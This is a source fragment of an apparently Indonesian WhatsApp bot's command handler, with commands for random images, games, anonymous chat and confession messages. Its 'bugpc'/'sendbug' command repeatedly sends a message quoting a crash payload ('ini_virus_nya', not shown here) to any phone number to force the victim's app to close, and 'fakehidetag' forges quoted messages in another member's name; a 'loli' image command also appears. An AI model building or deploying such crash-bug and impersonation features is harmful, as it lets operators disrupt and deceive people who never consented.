if (!isGroup) return reply(mess.OnlyGrup)
                   if (args.length < 2) return reply(`Kirim perintah *${command}* @tag|teks`)
                   var org = q.split("|")[0]
                   var teks = q.split("|")[1];
                   if (!org.startsWith('@')) return reply('Tag orangnya')
                   var mem2 = []
                   groupMembers.map( i => mem2.push(i.id) )
                   var mens = parseMention(target)
                //   addCountCmd('#fakehidetag', sender, _cmd)
                   var msg1 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { extemdedTextMessage: { text: `${prefix}hidetag ${teks}`, contextInfo: { mentionedJid: mens }}}}
                   var msg2 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { conversation: `${prefix}hidetag ${teks}` }}
                   lexxy.sendMessage(from, { text: teks ? teks : '', mentions: mem2 }, { quoted: mens.length > 2 ? msg1 : msg2 })
                   break
case prefix+'afk':
if (!isGroup) return reply(mess.OnlyGrup)
if (isAfkOn) return reply('AFK sudah diaktifkan sebelumnya')
if (body.slice(100)) return reply('Alasanlu kepanjangan')
let reason = body.slice(5) ? body.slice(5) : 'Nothing.'
addAfkUser(sender, Date.now(), reason, _afk)
reply(`@${sender.split('@')[0]} sedang afk\nAlasan : ${reason}`)
break
case prefix+'enc':
case prefix+'obfus':
case prefix+'encrypt':
case prefix+'obfuscator':
if (!q) return reply(`Kode Js Nya?`)
var INITEXTMYA = q
var obfuscationResult = JavaScriptObfuscator.obfuscate(`${INITEXTMYA}`,{
        compact: false,
        controlFlowFlattening: true,
        controlFlowFlatteningThreshold: 1,
        numbersToExpressions: true,
        simplify: true,
        stringArrayShuffle: true,
        splitStrings: true,
        stringArrayThreshold: 1
    }
);

reply(obfuscationResult.getObfuscatedCode())
break
case prefix+'ppcouple':
case prefix+'couple':{
reply(mess.wait)
var memsk = JSON.parse(fs.readFileSync('./lib/random/Couple.json'))
var jomek = pickRandom(memsk)
var cewek = await getBuffer(jomek.male)
var cowok = await getBuffer(jomek.female)
lexxy.sendMessage(from, { image: cewek, caption: '© pp cowoknya' }, { quoted: msg})
lexxy.sendMessage(from, { image: cowok, caption: '© pp ceweknya' }, { quoted: msg})
}
break
case prefix+'fakta': case prefix+'randomfakta':
var data = fs.readFileSync('./lib/random/fakta.txt', 'utf-8').split('\n')
reply(pickRandom(data))
break
case prefix+'quote': case prefix+'quotes':
case prefix+'randomquote': case prefix+'randomquotes':
var data = JSON.parse(fs.readFileSync('./lib/random/quotes.json'))
data = pickRandom(data)
reply(data.quotes+'\n\n-- '+data.author)
break
case prefix+'kagura':
reply(mess.wait)
var data = await pinterest('kagura')
var but = [{ buttonId: command, buttonText: { displayText: 'Next Photo' }, type: 1 }]
lexxy.sendMessage(from, { caption: "Random Kagura", image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya', headerType: 'IMAGE' }, { quoted: msg })
break
case prefix+'cecan': case prefix+'cewek':
reply(mess.wait)
var query = ["cecan hd","cecan indo","cewe cantik", "cewe aesthetic", "cecan aesthetic"]
var data = await pinterest(pickRandom(query))
var but = [{ buttonId: command, buttonText: { displayText: 'Next Photo' }, type: 1 }]
lexxy.sendMessage(from, { caption: "Random Cewe Cantik", image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya', headerType: 'IMAGE' }, { quoted: msg })
break
case prefix+'cogan': case prefix+'cowok':
reply(mess.wait)
var query = ["cogan hd","cogan indo","cowo ganteng","handsome boy","hot boy","oppa","cowo aesthetic","cogan aesthetic"]
var data = await pinterest(pickRandom(query))
var but = [{ buttonId: command, buttonText: { displayText: 'Next Photo' }, type: 1 }]
lexxy.sendMessage(from, { caption: "Random Cowo Ganteng", image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya', headerType: 'IMAGE' }, { quoted: msg })
break
case prefix+'quoteanime': case prefix+'quotesanime':
case prefix+'animequotes': case prefix+'animequote':
require('./lib/quoteanime').quoteAnime().then( res => {
var data = pickRandom(res)
var teks = `${data.quote}\n\n- ${data.char_name}\nin *${data.anime_title}* eps *${data.at_ep}*`
reply(teks)
}).catch((e) => reply(mess.error.api))
break
case prefix+'waifu':
reply(mess.wait)
var data = (await axios.get('https://waifu.pics/api/sfw/waifu')).data.url
var but = [{ buttonId: command, buttonText: { displayText: 'Next Photo' }, type: 1 }]
lexxy.sendMessage(from, { caption: "Random Waifu", image: { url: data }, buttons: but, headerType: 'IMAGE', footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: msg })
break
case prefix+'meme':{
reply(mess.wait)
var mems = JSON.parse(fs.readFileSync('./lib/random/Meme.json'))
var jomek = pickRandom(mems)
var gimemm = await getBuffer(jomek)
lexxy.sendMessage(from, { image: gimemm, caption: '© Random Meme'}, { quoted: msg})
}
break
case prefix+'jokes':{
reply(mess.wait)
var memsk = JSON.parse(fs.readFileSync('./lib/random/Darkjokes.json'))
var jomek = pickRandom(memsk)
var jokss = await getBuffer(jomek)
lexxy.sendMessage(from, { image: jokss, caption: '© Random Darkjoke' }, { quoted: msg})
}
break
case prefix+'kartun':{
reply(mess.wait)
var mems = JSON.parse(fs.readFileSync('./lib/random/Kartun.json'))
var jomek = pickRandom(mems)
var gimemm = await getBuffer(jomek)
lexxy.sendMessage(from, { image: gimemm, caption: '© Random Kartun'}, { quoted: msg})
}
break
case prefix+'anime':{
reply(mess.wait)
var mems = JSON.parse(fs.readFileSync('./lib/random/Anime.json'))
var jomek = pickRandom(mems)
var gimemm = await getBuffer(jomek.url)
lexxy.sendMessage(from, { image: gimemm, caption: '© Random Anime'}, { quoted: msg})
}
break
case prefix+'sakura':{
reply(mess.wait)
var mems = JSON.parse(fs.readFileSync('./lib/random/Sakura.json'))
var jomek = pickRandom(mems)
var gimemm = await getBuffer(jomek.url)
lexxy.sendMessage(from, { image: gimemm, caption: '© Random Sakura'}, { quoted: msg})
}
break
case prefix+'sasuke':{
reply(mess.wait)
var mems = JSON.parse(fs.readFileSync('./lib/random/Sasuke.json'))
var jomek = pickRandom(mems)
var gimemm = await getBuffer(jomek.url)
lexxy.sendMessage(from, { image: gimemm, caption: '© Random Sasuke'}, { quoted: msg})
}
break
case prefix+'nezuko':{
reply(mess.wait)
var mems = JSON.parse(fs.readFileSync('./lib/random/Nezuko.json'))
var jomek = pickRandom(mems)
var gimemm = await getBuffer(jomek.url)
lexxy.sendMessage(from, { image: gimemm, caption: '© Random Nezuko'}, { quoted: msg})
}
break
case prefix+'kucing':{
reply(mess.wait)
var mems = JSON.parse(fs.readFileSync('./lib/random/Kucing.json'))
var jomek = pickRandom(mems)
var gimemm = await getBuffer(jomek)
lexxy.sendMessage(from, { image: gimemm, caption: '© Random Kucing'}, { quoted: msg})
}
break
case prefix+'loli':{
reply(mess.wait)
var mems = JSON.parse(fs.readFileSync('./lib/random/Loli.json'))
var jomek = pickRandom(mems)
var gimemm = await getBuffer(jomek)
lexxy.sendMessage(from, { image: gimemm, caption: '© Random Loli'}, { quoted: msg})
}
break
case prefix+'menfes':
case prefix+'menfess':
if (isGroup) return reply("Gunakan bot ini di pesan pribadi:3")
if (!q) return reply(`Format Fitur Menfes / Kirim pesan rahasia ke seseorang Lewat bot\n\n_Example_\n${command} wa|pengirim|pesan\n\n_Contoh_\n${command} 6285789004732|bot|hai\n\nnote : Berawal dari 628xxx`)
let nomor_teman = q.split("|")[0]
let nama_pengirim = q.split("|")[1]
let pesan_teman = q.split("|")[2]
let nomor_pengirimnya = sender.split("@")[0]
lexxy.sendMessage(`${nomor_teman}@s.whatsapp.net`, { text: `━━━「 *MENFES* 」━━━\n\n*Hallo Kak Selamat ${ucapanWaktu}*\n*ini ada chat rahasia,*\n*dari seseorang*\n\n*isi pesan :* ${pesan_teman}\n*pengirim :* ${nama_pengirim}`, footer: 'klik button untuk membalas pesan', buttons: [{buttonId: `${prefix}balas_menfes ${nomor_pengirimnya}@s.whatsapp.net|${nomor_teman}@s.whatsapp.net`, buttonText: {displayText: 'balas✍️'}, type: 1}],headerType: 1 }, {quoted:fkontak})
reply('Sukses mengirimkan pesan ke dia.')
break
case prefix+'balas_menfes':
let pengirim_men = q.split("|")[0]
let penerima_men = q.split("|")[1]
db_menfes.push({id: penerima_men, teman: pengirim_men })
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes))
reply('Silahkan Masukan pesan yang ingin di balas ke dia.')
break
case prefix+'bugpc':
case prefix+'sendbug':{
if (isGroup) return reply('Khusus Chat Pribadi')
if (!isDeveloper) return reply('Khusus Developer Bot.')
if (!q) return reply(`Contoh:\n${prefix+command} 628xxx`)
let ini_nomor_hpnya = q
lexxy.sendMessage(`${ini_nomor_hpnya}@s.whatsapp.net`, {text: "Xd"}, {quoted:ini_virus_nya})
await sleep(20)
lexxy.sendMessage(`${ini_nomor_hpnya}@s.whatsapp.net`, {text: "Xd"}, {quoted:ini_virus_nya})
await sleep(20)
lexxy.sendMessage(`${ini_nomor_hpnya}@s.whatsapp.net`, {text: "Xd"}, {quoted:ini_virus_nya})
await sleep(20)
lexxy.sendMessage(`${ini_nomor_hpnya}@s.whatsapp.net`, {text: "Xd"}, {quoted:ini_virus_nya})
await sleep(20)
lexxy.sendMessage(`${ini_nomor_hpnya}@s.whatsapp.net`, {text: "Xd"}, {quoted:ini_virus_nya})
await sleep(20)
lexxy.sendMessage(`${ini_nomor_hpnya}@s.whatsapp.net`, {text: "Xd"}, {quoted:ini_virus_nya})
await sleep(20)
lexxy.sendMessage(`${ini_nomor_hpnya}@s.whatsapp.net`, {text: "Xd"}, {quoted:ini_virus_nya})
await sleep(20)
lexxy.sendMessage(`${ini_nomor_hpnya}@s.whatsapp.net`, {text: "Xd"}, {quoted:ini_virus_nya})
await sleep(20)
lexxy.sendMessage(`${ini_nomor_hpnya}@s.whatsapp.net`, {text: "Xd"}, {quoted:ini_virus_nya})
await sleep(20)
lexxy.sendMessage(`${ini_nomor_hpnya}@s.whatsapp.net`, {text: "Xd"}, {quoted:ini_virus_nya})
await sleep(7000)
reply(`Sukses mengirim bug for close ke nomor : Wa.me/${ini_nomor_hpnya}`)
}
break
case prefix+'ttc-solo': case prefix+'tictactoe-solo': case prefix+'ttcsolo':
//if (isGroup) return reply('Gunakan Fitur Ini Dichat Pribadi')
if (isTicTacToe(from, ttcsolo)) return reply(`Masih ada game yg blum selesai\nketik ${prefix}endttc untuk menghapus sesi`)
reply(monospace(`TICTACTOE GAME\n\n@${sender.split("@")[0]} melawan ${setting.botName}\n\nKirim (Y/N) untuk melanjutkan permainan`))
ttcsolo.push({
id: from,
status: null,
giliran: 'penantang',
penantang: sender,
ditantang: botName,
TicTacToe: ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣','9️⃣']
})
break
case prefix+'endttc': case prefix+'endtictactoe':
if (!isTicTacToe(from, ttcsolo)) return reply(`Tidak ada sesi game TicTacToe di Chat ini!`)
var posi = getPosTic(from, ttcsolo)
if (ttcsolo[posi].penantang == sender) {
reply(`Berhasil menghapus sesi TicTacToe Solo`)
ttcsolo.splice(posi, 1)
} else {
reply(`Anda bukan pemain, suruh @${ttcsolo[posi].penantang.split("@")[0]} untuk mengetik ${prefix}endttc`)
}
break
case prefix+'tictactoe': case prefix+'ttt': case prefix+'ttc':
if (!isGroup)return reply(mess.OnlyGrup)
if (isTicTacToe(from, tictactoe)) return reply(`Masih ada game yg blum selesai`)
if (args.length < 2) return reply(`Kirim perintah *${prefix}tictactoe* @tag`)
if (mentioned.length !== 1) {
if (mentioned[0] === botNumber) return reply(`Tidak bisa bermain dengan bot!`)
if (mentioned[0] === sender) return reply(`Sad amat main ama diri sendiri`)
// addCountCmd('#tictactoe', sende r, _cmd)
                     mentions(monospace(`@${sender.split('@')[0]} menantang @${mentioned[0].split('@')[0]} untuk bermain TicTacToe\n\nKirim (Y/N) untuk bermain`), [sender, mentioned[0]], false)
                     tictactoe.push({
                        id: from,
                        status: null,
                        penantang: sender,
                        ditantang: mentioned[0],
                        waktu: setTimeout(() => {
                          if (isTicTacToe(from, tictactoe)) lexxy.sendMessage(from, { text: `Waktu TicTacToe Habis, Tidak ada balasan dari @${mentioned[0].split("@")[0]}`, mentions: [mentioned[0]] })
                          var posi = getPosTic(from, tictactoe)
                          tictactoe.splice(posi, 1)
                        }, 30000),
                        timeout: 60000,
                        TicTacToe: ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣','9️⃣']
                     })
                    // gameAdd(sender, glimit)
                   } else {
                     reply(`Kirim perintah *${prefix}tictactoe* @tag`)
                   }
                   break
                case prefix+'delttt': case prefix+'delttc':
                   if (!isGroup)return reply(mess.OnlyGrup)
                   if (!isTicTacToe(from, tictactoe)) return reply(`Tidak ada sesi game tictactoe di grup ini`)
                   var posi = getPosTic(from, tictactoe)
                   if (tictactoe[posi].penantang.includes(sender)) {
                    // addCountCmd('#delttc', sender, _cmd)
                     tictactoe.splice(posi, 1)
                     reply(`Berhasil menghapus sesi tictactoe di grup ini`)
                   } else if (tictactoe[posi].ditantang.includes(sender)) {
              //       addCountCmd('#delttc', sender, _cmd)
                     tictactoe.splice(posi, 1)
                     reply(`Berhasil menghapus sesi tictactoe di grup ini`)
                   } else if (isGroupAdmins) {
                   //  addCountCmd('#delttc', sender, _cmd)
                     tictactoe.splice(posi, 1)
                     reply(`Berhasil menghapus sesi tictactoe di grup ini`)
                   } else if (isOwner) {
                 //    addCountCmd('#delttc', sender, _cmd)
                     tictactoe.splice(posi, 1)
                     reply(`Berhasil menghapus sesi tictactoe di grup ini`)
                   } else {
                     reply(`Anda tidak bisa menghapus sesi tictactoe, karena bukan pemain!`)
                   }
                   break
                // Anonymous Chat
                case prefix+'anonymous':
                   if (isGroup) return reply(mess.OnlyPM)
                   
                   var but = [
                     { urlButton: { displayText: "Instagram", url: "https://instagram.com/irfann._x" }},
                     { quickReplyButton: { displayText: "🔎 SEARCH 🔎", id: prefix+'start' }}
                   ]
                   var teks = `Hai ${pushname !== undefined ? pushname : 'Kak'} Selamat Datang di Anonymous Chat\n\nKetik ${prefix}search untuk mencari Teman Chat anda, atau bisa pencet tombol Search dibawah`
                   lexxy.sendMessage(from, { text: teks, footer: setting.footer, templateButtons: but })
                   break
                case prefix+'start': case prefix+'search':
                   if (isGroup) return reply(mess.OnlyPM)
                   //addCountCmd('#start', sender, _cmd)
                   var rumss = Object.values(anonymous).find(room => anonyCheck(sender, room))
                   var rooms = Object.values(anonymous).find(room => anonyCheck(sender, room) && room.state == 'CHATTING')
                   if (rooms) {
                     var but = [
                        { buttonId: prefix+'stop', buttonText: { displayText: "stop" }, type: 1 },
                        { buttonId: prefix+'skip', buttonText: { displayText: "skip" }, type: 1 }
                     ]
                     var teks = `[⚠️] Kamu masih dalam sesi chat dengan partner! ❌`
                     return lexxy.sendMessage(from, { text: teks, footer: setting.footer, buttons: but })
                   } else if (rumss) {
                     var teks = `[🔎] Mohon tunggu sedang mencari teman chat`
                     var but = [ { buttonId: prefix+'stop', buttonText: { displayText: "stop" }, type: 1 } ]
                     return lexxy.sendMessage(from, { text: teks, footer: setting.footer, buttons: but })
                   }
                   var roomm = Object.values(anonymous).find(room => room.state == "WAITING" && !anonyCheck(sender, room))
                   if (roomm) {
                     var but = [
                       { buttonId: prefix+'stop', buttonText: { displayText: "stop" }, type: 1 },
                       { buttonId: prefix+'skip', buttonText: { displayText: "skip" }, type: 1 }
                     ]
                     roomm.b = sender
                     roomm.state = "CHATTING"
                     var teks = `_Pasangan Ditemukan 🐼_\n${prefix}skip -- _cari pasangan baru_\n${prefix}stop -- _hentikan dialog ini_\n${prefix}sendprofil -- _mengirim contact ke dia_`
                     await lexxy.sendMessage(roomm.a, { text: teks, footer: setting.footer, buttons: but })
                     await lexxy.sendMessage(roomm.b, { text: teks, footer: setting.footer, buttons: but })
                   } else if (!rooms) {
                     let id = + new Date
                     anonymous[id] = {
                         id,
                         a: sender,
                         b: '',
                         state: "WAITING"
                     }
                     var but = [
                       { buttonId: prefix+'stop', buttonText: { displayText: "stop" }, type: 1 }
                     ]
                     var teks = `[🔎] Mohon tunggu sedang mencari teman chat`
                     await lexxy.sendMessage(from, { text: teks, footer: setting.footer, buttons: but })
                   }
                   break
                case prefix+'stop':
                   if (isGroup) return reply(mess.OnlyPM)
                   //addCountCmd('#stop', sender, _cmd)
                   var roomo = Object.values(anonymous).find(room => anonyCheck(sender, room))
                   if (!roomo) {
                     var but = [
                       { buttonId: prefix+'start', buttonText: { displayText: "search" }, type: 1 }
                     ]
                     var teks = `[⚠️] Kamu belum pernah mulai chat! ❌`
                     await lexxy.sendMessage(from, { text: teks, footer: setting.footer, buttons: but })
                   } else {
                     var but = [
                       { buttonId: prefix+'start', buttonText: { displayText: "search" }, type: 1 }
                     ]
                     var teks = `[✅] Berhasil memberhentikan chat`
                     var teks2 = `[⚠️] Sesi chat ini telah diberhentikan oleh teman chat kamu`
                     await lexxy.sendMessage(from, { text: teks, footer: setting.footer, buttons: but })
                     let other = anonyOther(sender, roomo)
                     if (other) await lexxy.sendMessage(other, { text: teks2, footer: setting.footer, buttons: but })
                     delete anonymous[roomo.id]
                   }
                   break
                case prefix+'next': case prefix+'skip':
                   if (isGroup) return reply(mess.OnlyPM)
                  // addCountCmd('#next', sender, _cmd)
                   let romeo = Object.values(anonymous).find(room => anonyCheck(sender, room))
                   var but = [
                     { buttonId: prefix+'start', buttonText: { displayText: "search" }, type: 1 }
                   ]
                   if (!romeo) {
                     var teks = `[⚠️] Kamu belum pernah memulai chat! ❌`
                     return await lexxy.sendMessage(from, { text: teks, footer: setting.footer, buttons: but })
                   } else {
                     let other = anonyOther(sender, romeo)
                     var teks1 = `[⚠️] Sesi chat ini telah diberhentikan oleh teman chat kamu! ❌`
                     if (other) await lexxy.sendMessage(other, { text: teks1, footer: setting.footer, buttons: but })
                     delete anonymous[romeo.id]
                   }
                   let room = Object.values(anonymous).find(room => room.state == "WAITING" && !anonyCheck(sender, room))
                   if (room) {
                     var but = [
                       { buttonId: prefix+'stop', buttonText: { displayText: "stop" }, type: 1 },
                       { buttonId: prefix+'skip', buttonText: { displayText: "skip" }, type: 1 }
                     ]
                     room.b = sender
                     room.state = "CHATTING"
                     var teks = `_Pasangan Ditemukan 🐼_\n${prefix}skip -- _cari pasangan baru_\n${prefix}stop -- _hentikan dialog ini_`
                     await lexxy.sendMessage(room.a, { text: teks, footer: setting.footer, buttons: but })
                     await lexxy.sendMessage(room.b, { text: teks, footer: setting.footer, buttons: but })
                   } else {
                     let id = + new Date
                     anonymous[id] = {
                         id,
                         a: sender,
                         b: '',
                         state: "WAITING"
                     }
                     var but = [
                       { buttonId: prefix+'stop', buttonText: { displayText: "❌ STOP ❌" }, type: 1 }
                     ]
                     var teks = `[🔎] Mohon tunggu sedang mencari teman chat`
                     await lexxy.sendMessage(from, { text: teks, footer: setting.footer, buttons: but })
                   }
                   break
                case prefix+'sendprofile': case prefix+'sendprofil':
                   if (isGroup) return reply(mess.OnlyPM)
                   let romoe = Object.values(anonymous).find(room => anonyCheck(sender, room) && room.state == 'CHATTING')
                 //  addCountCmd('#sendprofile', sender, _cmd)
                   var but = [
                     { buttonId: prefix+'start', buttonText: { displayText: "🔎 SEARCH 🔎" }, type: 1 }
                   ]
                   if (!romoe) {
                     var teks = `[⚠️] Kamu belum pernah memulai chat! ❌`
                     await lexxy.sendMessage(from, { text: teks, footer: setting.footer, buttons: but })
                   } else {
                     let rms = Object.values(anonymous).find(room => [room.a, room.b].includes(sender) && room.state == "CHATTING")
                     var partnerJID = anonyOther(sender, rms)
                     var res = await lexxy.sendContact(partnerJID, [sender.split("@")[0]])
                     lexxy.sendMessage(from, { text: '[✅] Berhasil mengirim profil ke teman chat anda!' }, { quoted: msg })
                     lexxy.sendMessage(partnerJID, { text: '[👨👩] Teman chat kamu memberikan kontak profil nya!' }, { quoted: res })
                   }
                   break
default:
if (!isGroup && !isCmd) {
if (cekUser("id", sender) == null) return
if (cekUser("teman", sender) == false) return
const reactionMessage = { react: { text: "✉", key: msg.key}}
lexxy.sendMessage(from, reactionMessage)
if (m.messages[0].type == "conversation" || m.messages[0].type == "extendedTextMessage") {
try{ var text1 = m.messages[0].message.extendedTextMessage.text } catch (err) { var text1 = m.messages[0].message.conversation }
lexxy.sendMessage(cekUser("teman", sender), {text: text1 }, {quoted:{ key: {fromMe: false, participant: `${botNumber}`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: {"conversation": "━━━「 *PESAN-DIBALAS* 」━━━"}} })
let menfes_kosong = "[]"
db_menfes.splice(menfes_kosong)
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes))
reply('balasan chat kamu sudah di teruskan.')
}}
}} catch (err) {
console.log(color('[ERROR]', 'red'), err)}}